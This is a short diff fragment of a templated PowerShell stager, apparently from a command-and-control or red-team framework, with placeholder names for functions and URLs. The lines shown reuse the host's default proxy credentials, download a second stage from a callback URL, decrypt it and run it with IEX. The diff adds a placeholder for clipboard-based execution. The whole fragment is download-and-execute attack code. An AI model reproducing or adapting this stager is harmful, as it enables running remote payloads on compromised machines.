@@ -32,3 +32,5 @@ $K.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials
 $code = {{symbol_name("Decrypt-String")}} ($K.downloadstring(${{symbol_name("CALLBACK_URL")}}+'{{stage2}}'))
 
 IEX $code
+
+{{exec_clipboard_entry}}
